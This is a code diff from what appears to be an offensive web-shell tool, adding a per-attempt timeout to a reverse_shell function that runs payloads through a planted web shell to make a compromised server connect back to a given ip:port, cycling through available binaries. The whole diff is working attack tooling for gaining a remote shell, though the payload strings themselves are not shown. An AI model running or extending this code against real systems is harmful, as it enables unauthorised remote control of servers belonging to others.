@@ -59,11 +59,22 @@ def _payload(method: str, binary: str, ip: str, port: str) -> str:
     raise ValueError(f"unknown reverse-shell method: {method}")
 
 
-def reverse_shell(ws: WebShell, ip: str, port: int | str, method: str = "auto") -> bool:
+def reverse_shell(
+    ws: WebShell,
+    ip: str,
+    port: int | str,
+    method: str = "auto",
+    attempt_timeout: float | None = None,
+) -> bool:
     """Fire a reverse shell to ``ip:port``. Returns True once one fires.
 
     The HTTP request blocks while the shell lives, so a connection drop/timeout
     is the *expected* success path — have your listener ready first.
+
+    ``attempt_timeout`` bounds each individual attempt: a connecting shell makes
+    the request hang, so we wait this long (the timeout is read as success)
+    before moving to the next method, instead of blocking for the full transport
+    timeout when a method's binary exists but never connects back.
     """
     port = str(int(port))
     methods = _AUTO_ORDER if method == "auto" else [method]
@@ -74,11 +85,16 @@ def reverse_shell(ws: WebShell, ip: str, port: int | str, method: str = "auto") 
         if not binary:
             continue
         log.success(f"Trying {name} reverse shell ({binary}) -> {ip}:{port}")
+        original = ws.transport.config.timeout
+        if attempt_timeout is not None:
+            ws.transport.config.timeout = attempt_timeout
         try:
             ws.run_command(_payload(name, binary, ip, port))
         except ConnectionFailed:
             log.success("Connection closed by the reverse shell (this is expected).")
             return True
+        finally:
+            ws.transport.config.timeout = original
         log.warning(f"{name} returned without connecting; trying next method.")
     log.error("No reverse-shell method succeeded.")
     return False
